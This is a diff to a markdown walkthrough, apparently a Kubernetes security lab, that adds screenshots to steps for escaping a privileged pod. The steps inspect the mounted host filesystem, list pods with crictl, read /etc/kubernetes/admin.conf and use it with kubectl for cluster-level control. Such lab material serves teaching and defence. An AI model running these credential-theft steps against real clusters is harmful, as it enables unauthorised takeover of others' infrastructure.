@@ -62,6 +62,9 @@ Check container capabilities and privileges:
 capsh --print
 mount
 
+<img width="934" height="308" alt="image" src="https://github.com/user-attachments/assets/a5fb8456-16c4-4a15-a0d1-185ba44bd97d" />
+<img width="945" height="380" alt="image" src="https://github.com/user-attachments/assets/946f6ab0-ab9f-4960-9194-57949eb2fc9f" />
+<img width="937" height="304" alt="image" src="https://github.com/user-attachments/assets/3c1d9208-3bc4-4cfb-b3cd-0ee9bcb2f17e" />
 
 
 2️⃣ Verify Host Filesystem is Mounted
@@ -69,6 +72,7 @@ mount
 List the mounted host filesystem:
 
 ls /host-system/
+<img width="875" height="51" alt="image" src="https://github.com/user-attachments/assets/682f9060-12fb-446f-b302-265ec0e252ea" />
 
 
 If you see directories like /bin, /etc, /var, /lib, /root,
@@ -93,6 +97,10 @@ ls /
 You are still inside the pod namespaces,
 but now you control the node disk — which is already a critical compromise.
 
+<img width="784" height="71" alt="image" src="https://github.com/user-attachments/assets/e69b28ce-1c7d-4225-a525-6f694c2636f7" />
+
+
+
 4️⃣ Inspect Running Pods From the Host Runtime
 crictl pods
 
@@ -105,6 +113,7 @@ On most Kubernetes clusters, node admin credentials exist here:
 
 cat /etc/kubernetes/admin.conf
 
+<img width="934" height="368" alt="image" src="https://github.com/user-attachments/assets/8f995dd3-5d48-4abc-b7fd-c2d69eaaf0ff" />
 
 This file gives HIGH privilege access.
 
@@ -113,14 +122,19 @@ This file gives HIGH privilege access.
 List cluster system resources:
 
 kubectl --kubeconfig /etc/kubernetes/admin.conf get all -n kube-system
+<img width="913" height="348" alt="image" src="https://github.com/user-attachments/assets/c0b06a32-f25b-48dd-8a41-5c30b8a4e0e2" />
 
 
 List nodes:
 
 kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes
+<img width="802" height="58" alt="image" src="https://github.com/user-attachments/assets/8ff03c90-0c9b-4cef-95f6-d140b354720b" />
 
 
 🎉 Congratulations — you now have cluster-level control using credentials stolen from the node.
+
+This is a realistic adversary path:
+Container Escape → Host Filesystem → Steal admin.conf → Full Cluster Control
 
 From here, lateral movement and post-exploitation becomes possible depending on environment.
 
